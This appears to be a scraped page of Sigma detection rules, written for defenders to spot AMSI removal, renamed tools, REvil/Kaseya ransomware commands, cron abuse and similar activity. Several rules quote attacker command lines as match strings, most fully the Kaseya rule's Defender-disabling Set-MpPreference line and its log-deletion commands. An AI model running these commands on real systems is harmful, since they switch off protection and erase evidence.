rule (edit) title: Removal Amsi Provider Reg Key id: 41d1058a-aea7-4952-9293-29eaaf516465 description: Remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection status: experimental date: 2021/06/07 author: frack113 tags: - attack.defense_evasion - attack.t1562.001 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://seclists.org/fulldisclosure/2020/Mar/45 logsource: product: windows category: registry_event definition: key must be add to the sysmon configuration to works detection: selection: EventType: DeleteKey TargetObject|endswith: - \u0026#39;{2781761E-28E0-4109-99FE-B9D127C57AFE}\u0026#39; - \u0026#39;{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_removal_amsi_registry_key.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Removal Amsi Provider Reg Key"},{"categories":null,"contents":"A General detection to trigger for processes removing .*\\shell\\open\\command registry keys. Registry keys that might have been used for COM hijacking activities.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/7 https://threathunterplaybook.com/evals/apt29/detections/3.C.1_22A46621-7A92-48C1-81BF-B3937EB4FDC3.html https://docs.microsoft.com/en-us/windows/win32/shell/launch https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand https://docs.microsoft.com/en-us/windows/win32/shell/shell-and-managed-code Raw rule (edit) title: Removal of Potential COM Hijacking Registry Keys id: 96f697b0-b499-4e5d-9908-a67bec11cdb6 status: test description: A General detection to trigger for processes removing .*\\shell\\open\\command registry keys. Registry keys that might have been used for COM hijacking activities. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/7 - https://threathunterplaybook.com/evals/apt29/detections/3.C.1_22A46621-7A92-48C1-81BF-B3937EB4FDC3.html - https://docs.microsoft.com/en-us/windows/win32/shell/launch - https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand - https://docs.microsoft.com/en-us/windows/win32/shell/shell-and-managed-code date: 2020/05/02 modified: 2022/03/05 logsource: product: windows category: registry_event detection: selection: EventType: \u0026#39;DeleteKey\u0026#39; TargetObject|endswith: \u0026#39;\\shell\\open\\command\u0026#39; filter_svchost: Image: \u0026#39;C:\\Windows\\system32\\svchost.exe\u0026#39; filter_office: Image|startswith: - \u0026#39;C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\u0026#39; - \u0026#39;C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\u0026#39; Image|endswith: \u0026#39;\\OfficeClickToRun.exe\u0026#39; filter_integrator: Image: \u0026#39;C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\u0026#39; filter_dropbox: Image|endswith: \u0026#39;\\Dropbox.exe\u0026#39; TargetObject|startswith: \u0026#39;HKCR\\Dropbox.\u0026#39; condition: selection and not 1 of filter_* falsepositives: - unknown level: medium tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_removal_com_hijacking_registry_key.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Removal of Potential COM Hijacking Registry Keys"},{"categories":null,"contents":"Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/ Raw rule (edit) title: Remove Windows Defender Definition Files id: 9719a8aa-401c-41af-8108-ced7ec9cd75c status: experimental author: frack113 date: 2021/07/07 description: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/ tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: OriginalFileName: MpCmdRun.exe CommandLine|contains|all: - \u0026#39; -RemoveDefinitions\u0026#39; - \u0026#39; -All\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_remove_windows_defender_definition_files.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Remove Windows Defender Definition Files"},{"categories":null,"contents":"Detects renamed jusched.exe used by cobalt group\nKnown false-positives penetration tests, red teaming References https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf Raw rule (edit) title: Renamed jusched.exe id: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb status: test description: Detects renamed jusched.exe used by cobalt group author: Markus Neis, Swisscom references: - https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf date: 2019/06/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Description: Java Update Scheduler selection2: Description: Java(TM) Update Scheduler filter: Image|endswith: - \u0026#39;\\jusched.exe\u0026#39; condition: (selection1 or selection2) and not filter falsepositives: - penetration tests, red teaming level: high tags: - attack.execution - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_jusched.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1036.003"],"title":"Renamed jusched.exe"},{"categories":null,"contents":"Detects the execution of a renamed meg.exe of MegaSync during incident response engagements associated with ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.\nKnown false-positives Software that illegaly integrates MegaSync in a renamed form Administrators that have renamed MegaSync References https://redcanary.com/blog/rclone-mega-extortion/ Raw rule (edit) title: Renamed MegaSync id: 643bdcac-8b82-49f4-9fd9-25a90b929f3b status: experimental description: Detects the execution of a renamed meg.exe of MegaSync during incident response engagements associated with ransomware families like Nefilim, Sodinokibi, Pysa, and Conti. references: - https://redcanary.com/blog/rclone-mega-extortion/ author: Sittikorn S date: 2021/06/22 tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: process_creation detection: selection_proc: ParentImage|endswith: \u0026#39;\\explorer.exe\u0026#39; CommandLine|contains: \u0026#39;C:\\Windows\\Temp\\meg.exe\u0026#39; selection_orig: OriginalFileName: \u0026#39;meg.exe\u0026#39; filter: Image|endswith: \u0026#39;\\meg.exe\u0026#39; condition: selection_proc or ( selection_orig and not filter ) falsepositives: - Software that illegaly integrates MegaSync in a renamed form - Administrators that have renamed MegaSync level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_megasync.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Renamed MegaSync"},{"categories":null,"contents":"Detects suspicious renamed PAExec execution as often used by attackers\nKnown false-positives Weird admins that rename their tools Software companies that bundle PAExec with their software and rename it, so that it is less embarrassing References https://www.poweradmin.com/paexec/ Raw rule (edit) title: Renamed PAExec id: c4e49831-1496-40cf-8ce1-b53f942b02f9 status: experimental description: Detects suspicious renamed PAExec execution as often used by attackers references: - https://www.poweradmin.com/paexec/ author: Florian Roth date: 2021/05/22 modified: 2021/07/06 logsource: category: process_creation product: windows detection: selection1: Description: \u0026#39;PAExec Application\u0026#39; selection2: OriginalFileName: \u0026#39;PAExec.exe\u0026#39; filter: Image|endswith: - \u0026#39;\\PAexec.exe\u0026#39; - \u0026#39;\\paexec.exe\u0026#39; condition: ( selection1 or selection2 ) and not filter falsepositives: - Weird admins that rename their tools - Software companies that bundle PAExec with their software and rename it, so that it is less embarrassing level: high tags: - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_renamed_paexec.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Renamed PAExec"},{"categories":null,"contents":"Detects renamed powershell\nKnown false-positives unknown References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse Raw rule (edit) title: Renamed Powershell Under Powershell Channel id: 30a8cb77-8eb3-4cfb-8e79-ad457c5a4592 description: Detects renamed powershell status: test references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse author: Harish Segar, frack113 date: 2020/06/29 modified: 2021/10/16 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostName: ConsoleHost filter: HostApplication|startswith: - powershell.exe - C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe condition: selection and not filter falsepositives: - unknown level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_renamed_powershell.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Renamed Powershell Under Powershell Channel"},{"categories":null,"contents":"Detects suspicious renamed SysInternals DebugView execution\nKnown false-positives Unknown References https://www.epicturla.com/blog/sysinturla Raw rule (edit) title: Renamed SysInternals Debug View id: cd764533-2e07-40d6-a718-cfeec7f2da7f status: test description: Detects suspicious renamed SysInternals DebugView execution author: Florian Roth references: - https://www.epicturla.com/blog/sysinturla date: 2020/05/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Product: - \u0026#39;Sysinternals DebugView\u0026#39; - \u0026#39;Sysinternals Debugview\u0026#39; filter: OriginalFileName: \u0026#39;Dbgview.exe\u0026#39; Image|endswith: \u0026#39;\\Dbgview.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.resource_development - attack.t1588.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_renamed_debugview.yml/","tags":["attack.resource_development","attack.t1588.002"],"title":"Renamed SysInternals Debug View"},{"categories":null,"contents":"Detects process command line patterns and locations used by REvil group in Kaseya incident (can also match on other malware)\nKnown false-positives Unknown References https://community.sophos.com/b/security-blog/posts/active-ransomware-attack-on-kaseya-customers https://www.joesandbox.com/analysis/443736/0/html https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b https://therecord.media/revil-ransomware-executes-supply-chain-attack-via-malicious-kaseya-update/ https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/ Raw rule (edit) title: REvil Kaseya Incident Malware Patterns id: 5de632bc-7fbd-4c8a-944a-fce55c59eae5 status: test description: Detects process command line patterns and locations used by REvil group in Kaseya incident (can also match on other malware) references: - https://community.sophos.com/b/security-blog/posts/active-ransomware-attack-on-kaseya-customers - https://www.joesandbox.com/analysis/443736/0/html - https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b - https://therecord.media/revil-ransomware-executes-supply-chain-attack-via-malicious-kaseya-update/ - https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/ author: Florian Roth date: 2021/07/03 modified: 2022/02/28 tags: - attack.execution - attack.t1059 - attack.g0115 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;C:\\Windows\\cert.exe\u0026#39; - \u0026#39;Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled\u0026#39; - \u0026#39;del /q /f c:\\kworking\\agent.crt\u0026#39; - \u0026#39;Kaseya VSA Agent Hot-fix\u0026#39; - \u0026#39;\\AppData\\Local\\Temp\\MsMpEng.exe\u0026#39; - \u0026#39;rmdir /s /q %SystemDrive%\\inetpub\\logs\u0026#39; - \u0026#39;del /s /q /f %SystemDrive%\\\\*.log\u0026#39; - \u0026#39;c:\\kworking1\\agent.exe\u0026#39; - \u0026#39;c:\\kworking1\\agent.crt\u0026#39; selection2: Image: - \u0026#39;C:\\Windows\\MsMpEng.exe\u0026#39; - \u0026#39;C:\\Windows\\cert.exe\u0026#39; - \u0026#39;C:\\kworking\\agent.exe\u0026#39; - \u0026#39;C:\\kworking1\\agent.exe\u0026#39; selection3: CommandLine|contains|all: - \u0026#39;del /s /q /f\u0026#39; - \u0026#39;WebPages\\Errors\\webErrorLog.txt\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_revil_kaseya.yml/","tags":["attack.execution","attack.t1059","attack.g0115"],"title":"REvil Kaseya Incident Malware Patterns"},{"categories":null,"contents":"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nKnown false-positives Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn\u0026rsquo;t trigger FP References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md Raw rule (edit) title: Root Certificate Installed id: 42821614-9264-4761-acfc-5772c3286f76 status: experimental description: Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md author: \u0026#39;oscd.community, @redcanary, Zach Stanford @svch0st\u0026#39; date: 2020/10/10 modified: 2021/12/04 tags: - attack.defense_evasion - attack.t1553.004 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection1: ScriptBlockText|contains|all: - \u0026#39;Move-Item\u0026#39; - \u0026#39;Cert:\\LocalMachine\\Root\u0026#39; selection2: ScriptBlockText|contains|all: - \u0026#39;Import-Certificate\u0026#39; - \u0026#39;Cert:\\LocalMachine\\Root\u0026#39; condition: selection1 or selection2 level: medium falsepositives: - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn\u0026#39;t trigger FP ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_root_certificate_installed.yml/","tags":["attack.defense_evasion","attack.t1553.004"],"title":"Root Certificate Installed"},{"categories":null,"contents":"Detects suspicious Ruby on Rails exceptions that could indicate exploitation attempts\nKnown false-positives Application bugs Penetration testing References http://edgeguides.rubyonrails.org/security.html http://guides.rubyonrails.org/action_controller_overview.html https://stackoverflow.com/questions/25892194/does-rails-come-with-a-not-authorized-exception https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb Raw rule (edit) title: Ruby on Rails Framework Exceptions id: 0d2c3d4c-4b48-4ac3-8f23-ea845746bb1a status: stable description: Detects suspicious Ruby on Rails exceptions that could indicate exploitation attempts author: Thomas Patzke date: 2017/08/06 modified: 2020/09/01 references: - http://edgeguides.rubyonrails.org/security.html - http://guides.rubyonrails.org/action_controller_overview.html - https://stackoverflow.com/questions/25892194/does-rails-come-with-a-not-authorized-exception - https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb logsource: category: application product: ruby_on_rails detection: keywords: - ActionController::InvalidAuthenticityToken - ActionController::InvalidCrossOriginRequest - ActionController::MethodNotAllowed - ActionController::BadRequest - ActionController::ParameterMissing condition: keywords falsepositives: - Application bugs - Penetration testing level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/ruby/appframework_ruby_on_rails_exceptions.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Ruby on Rails Framework Exceptions"},{"categories":null,"contents":"Rule to detect the configuration of Run Once registry key. Configured payload can be run by runonce.exe /AlternateShellStartup\nKnown false-positives Legitimate modification of the registry key by legitimate program References https://twitter.com/pabraeken/status/990717080805789697 https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml Raw rule (edit) title: Run Once Task Configuration in Registry id: c74d7efc-8826-45d9-b8bb-f04fac9e4eff status: test description: Rule to detect the configuration of Run Once registry key. Configured payload can be run by runonce.exe /AlternateShellStartup author: \u0026#39;Avneet Singh @v3t0_, oscd.community\u0026#39; references: - https://twitter.com/pabraeken/status/990717080805789697 - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml date: 2020/11/15 modified: 2022/02/15 logsource: product: windows category: registry_event detection: selection: TargetObject|startswith: \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\u0026#39; TargetObject|endswith: \u0026#39;\\StubPath\u0026#39; filter_chrome: Details|startswith: \u0026#39;\u0026#34;C:\\Program Files\\Google\\Chrome\\Application\\\u0026#39; Details|endswith: \u0026#39;\\Installer\\chrmstp.exe\u0026#34; --configure-user-settings --verbose-logging --system-level\u0026#39; condition: selection and not 1 of filter_* falsepositives: - Legitimate modification of the registry key by legitimate program level: medium tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_runonce_persistence.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Run Once Task Configuration in Registry"},{"categories":null,"contents":"This rule detects the execution of Run Once task as configured in the registry\nKnown false-positives Unknown References https://twitter.com/pabraeken/status/990717080805789697 https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml Raw rule (edit) title: Run Once Task Execution as Configured in Registry id: 198effb6-6c98-4d0c-9ea3-451fa143c45c status: test description: This rule detects the execution of Run Once task as configured in the registry author: \u0026#39;Avneet Singh @v3t0_, oscd.community\u0026#39; references: - https://twitter.com/pabraeken/status/990717080805789697 - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml date: 2020/10/18 modified: 2021/11/27 logsource: product: windows category: process_creation detection: process_name: Image|endswith: - \u0026#39;\\runonce.exe\u0026#39; process_description: Description: - \u0026#39;Run Once Wrapper\u0026#39; command_line: CommandLine|contains: - \u0026#39; /AlternateShellStartup\u0026#39; condition: (process_name or process_description) and command_line falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_runonce_execution.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"Run Once Task Execution as Configured in Registry"},{"categories":null,"contents":"Detects PowerShell script execution from Alternate Data Stream (ADS)\nKnown false-positives Unknown References https://github.com/p0shkatz/Get-ADS/blob/master/Get-ADS.ps1 Raw rule (edit) title: Run PowerShell Script from ADS id: 45a594aa-1fbd-4972-a809-ff5a99dd81b8 status: test description: Detects PowerShell script execution from Alternate Data Stream (ADS) author: Sergey Soldatov, Kaspersky Lab, oscd.community references: - https://github.com/p0shkatz/Get-ADS/blob/master/Get-ADS.ps1 date: 2019/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\powershell.exe\u0026#39; Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains|all: - \u0026#39;Get-Content\u0026#39; - \u0026#39;-Stream\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_run_powershell_script_from_ads.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Run PowerShell Script from ADS"},{"categories":null,"contents":"Detects PowerShell script execution via input stream redirect\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml https://twitter.com/Moriarty_Meng/status/984380793383370752 Raw rule (edit) title: Run PowerShell Script from Redirected Input Stream id: c83bf4b5-cdf0-437c-90fa-43d734f7c476 status: test description: Detects PowerShell script execution via input stream redirect author: Moriarty Meng (idea), Anton Kutepov (rule), oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml - https://twitter.com/Moriarty_Meng/status/984380793383370752 date: 2020/10/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: powershell_started: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; redirect_to_input_stream: CommandLine|re: \u0026#39;\\s-\\s*\u0026lt;\u0026#39; condition: powershell_started and redirect_to_input_stream falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.execution - attack.t1059 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_run_powershell_script_from_input_stream.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1059"],"title":"Run PowerShell Script from Redirected Input Stream"},{"categories":null,"contents":"Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation.\nKnown false-positives Possible name overlap with NT AUHTORITY substring to cover all languages References https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment Raw rule (edit) title: Run Whoami as SYSTEM id: 80167ada-7a12-41ed-b8e9-aa47195c66a1 status: experimental description: Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation. references: - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment author: Teymur Kheirkhabarov, Florian Roth date: 2019/10/23 modified: 2022/01/28 tags: - attack.privilege_escalation - attack.discovery - attack.t1033 logsource: category: process_creation product: windows detection: selection: User|contains: # covers many language settings - \u0026#39;AUTHORI\u0026#39; - \u0026#39;AUTORI\u0026#39; Image|endswith: \u0026#39;\\whoami.exe\u0026#39; condition: selection falsepositives: - Possible name overlap with NT AUHTORITY substring to cover all languages level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_whoami_as_system.yml/","tags":["attack.privilege_escalation","attack.discovery","attack.t1033"],"title":"Run Whoami as SYSTEM"},{"categories":null,"contents":"Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privieleges. This is often used after a privilege escalation attempt.\nKnown false-positives Administrative activity (rare lookups on current privileges) References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami Raw rule (edit) title: Run Whoami Showing Privileges id: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b status: experimental description: Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privieleges. This is often used after a privilege escalation attempt. references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami author: Florian Roth date: 2021/05/05 tags: - attack.privilege_escalation - attack.discovery - attack.t1033 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\whoami.exe\u0026#39; CommandLine|contains: \u0026#39;/priv\u0026#39; condition: selection falsepositives: - Administrative activity (rare lookups on current privileges) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_whoami_priv.yml/","tags":["attack.privilege_escalation","attack.discovery","attack.t1033"],"title":"Run Whoami Showing Privileges"},{"categories":null,"contents":"Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module\nKnown false-positives Unknown References https://bczyz1.github.io/2021/01/30/psexec.html Raw rule (edit) title: Rundll32 Without Parameters id: 5bb68627-3198-40ca-b458-49f973db8752 status: experimental description: Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module author: Bartlomiej Czyz, Relativity date: 2021/01/31 references: - https://bczyz1.github.io/2021/01/30/psexec.html tags: - attack.lateral_movement - attack.t1021.002 - attack.t1570 - attack.execution - attack.t1569.002 logsource: category: process_creation product: windows detection: selection: CommandLine: \u0026#39;rundll32.exe\u0026#39; condition: selection fields: - ComputerName - SubjectUserName - CommandLine - Image - ParentImage falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_rundll32_without_parameters.yml/","tags":["attack.lateral_movement","attack.t1021.002","attack.t1570","attack.execution","attack.t1569.002"],"title":"Rundll32 Without Parameters"},{"categories":null,"contents":"Detects Ryuk Ransomware command lines\nKnown false-positives Unlikely References https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/ Raw rule (edit) title: Ryuk Ransomware id: 0acaad27-9f02-4136-a243-c357202edd74 status: test description: Detects Ryuk Ransomware command lines author: Vasiliy Burov references: - https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/ date: 2019/08/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains|all: - \u0026#39;stop\u0026#39; CommandLine|contains: - \u0026#39;samss\u0026#39; - \u0026#39;audioendpointbuilder\u0026#39; - \u0026#39;unistoresvc_?????\u0026#39; condition: selection falsepositives: - Unlikely level: critical tags: - attack.execution - attack.t1204 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mal_ryuk.yml/","tags":["attack.execution","attack.t1204"],"title":"Ryuk Ransomware"},{"categories":null,"contents":"Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to CVE-2019-0708 RDP RCE aka BlueKeep\nKnown false-positives Unlikely References https://twitter.com/AdamTheAnalyst/status/1134394070045003776 https://github.com/zerosum0x0/CVE-2019-0708 Raw rule (edit) title: Scanner PoC for CVE-2019-0708 RDP RCE Vuln id: 8400629e-79a9-4737-b387-5db940ab2367 description: Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to CVE-2019-0708 RDP RCE aka BlueKeep status: experimental references: - https://twitter.com/AdamTheAnalyst/status/1134394070045003776 - https://github.com/zerosum0x0/CVE-2019-0708 tags: - attack.lateral_movement - attack.t1210 - car.2013-07-002 author: Florian Roth (rule), Adam Bradbury (idea) date: 2019/06/02 modified: 2021/11/12 logsource: product: windows service: security detection: selection: EventID: 4625 TargetUserName: AAAAAAA condition: selection falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_rdp_bluekeep_poc_scanner.yml/","tags":["attack.lateral_movement","attack.t1210","car.2013-07-002"],"title":"Scanner PoC for CVE-2019-0708 RDP RCE Vuln"},{"categories":null,"contents":"Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md Raw rule (edit) title: Scheduled Cron Task/Job id: 7c3b43d8-d794-47d2-800a-d277715aa460 status: test description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: - \u0026#39;/crontab\u0026#39; CommandLine|contains: - \u0026#39;/tmp/\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.t1053.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_schedule_task_job_cron.yml/","tags":["attack.execution","attack.persistence","attack.privilege_escalation","attack.t1053.003"],"title":"Scheduled Cron Task/Job"},{"categories":null,"contents":"Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.\nKnown false-positives Legitimate administration activities References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md Raw rule (edit) title: Scheduled Cron Task/Job id: 6b14bac8-3e3a-4324-8109-42f0546a347f status: test description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder. author: Alejandro Ortuno, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: linux detection: selection: Image|endswith: - \u0026#39;crontab\u0026#39; CommandLine|contains: - \u0026#39;/tmp/\u0026#39; condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.t1053.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_schedule_task_job_cron.yml/","tags":["attack.execution","attack.persistence","attack.privilege_escalation","attack.t1053.003"],"title":"Scheduled Cron Task/Job"},{"categories":null,"contents":"Detects scheduled task deletion events. Scheduled tasks are likely to be deleted if not used for persistence. Malicious Software often creates tasks directly under the root node e.g. \\TASKNAME\nKnown false-positives Software installation References https://twitter.com/matthewdunwoody/status/1352356685982146562 https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4699 Raw rule (edit) title: Scheduled Task Deletion id: 4f86b304-3e02-40e3-aa5d-e88a167c9617 description: Detects scheduled task deletion events. Scheduled tasks are likely to be deleted if not used for persistence. Malicious Software often creates tasks directly under the root node e.g. \\TASKNAME status: experimental author: David Strassegger date: 2021/01/22 tags: - attack.execution - attack.privilege_escalation - car.2013-08-001 - attack.t1053.005 references: - https://twitter.com/matthewdunwoody/status/1352356685982146562 - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4699 logsource: product: windows service: security definition: \u0026#39;The Advanced Audit Policy setting Object Access \u0026gt; Audit Other Object Access Events has to be configured to allow this detection. We also recommend extracting the Command field from the embedded XML in the event data.\u0026#39; detection: selection: EventID: 4699 condition: selection falsepositives: - Software installation level: medium 